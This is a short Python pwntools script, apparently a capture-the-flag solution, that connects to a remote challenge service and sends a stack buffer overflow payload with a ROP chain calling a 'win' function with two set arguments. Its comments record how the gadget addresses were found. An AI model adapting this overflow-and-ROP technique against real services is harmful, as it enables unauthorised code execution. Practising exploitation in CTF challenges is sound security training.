#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./chain_reactor', checksec=False)

p = remote("offsec.m0lecon.it", 13565)

OFFSET_TO_RIP = 72

# By running: ROPgadget --binary ./chain_reactor | grep "pop rdi"
# we find that:
POP_RDI_RET = 0x40121f

# By running: ROPgadget --binary ./chain_reactor | grep "pop rsi"
# we find that:
POP_RSI_RET = 0x401221

# By running: ROPgadget --binary ./chain_reactor | grep "ret"
# we find that:
RET_GADGET = 0x40101a

# By running: nm ./chain_reactor | grep "win"
# we find that:
win_address = 0x401226


payload = flat(
    b'A' * OFFSET_TO_RIP,
    p64(RET_GADGET),
    p64(POP_RDI_RET), p64(0xc0ffee),
    p64(POP_RSI_RET), p64(0xbadc0de),
    p64(win_address)
)

p.recvuntil(b'[chain-reactor] Enter activation codes: ')
p.send(payload)
p.interactive()
